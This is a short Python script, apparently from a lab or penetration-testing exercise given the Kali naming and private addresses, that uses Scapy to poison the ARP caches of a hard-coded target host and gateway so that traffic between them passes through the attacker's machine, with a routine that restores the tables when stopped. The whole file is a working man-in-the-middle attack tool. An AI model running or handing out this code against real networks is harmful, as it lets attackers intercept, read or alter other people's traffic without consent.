from scapy.all import *
import time

target_ip = "10.15.31.153"
gateway_ip = "10.15.0.1"
target_mac = "0a:ca:11:df:10:77"   # Lowercase
gateway_mac = "0a:72:ba:0f:5d:5c"  # Lowercase
kali_mac = get_if_hwaddr(conf.iface)

def spoof():
    while True:
        sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=kali_mac), verbose=0)
        sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=kali_mac), verbose=0)
        time.sleep(1)

try:
    spoof()
except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=gateway_mac), count=5, verbose=0)
    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=target_mac), count=5, verbose=0)
    print("[+] MITM stopped.")
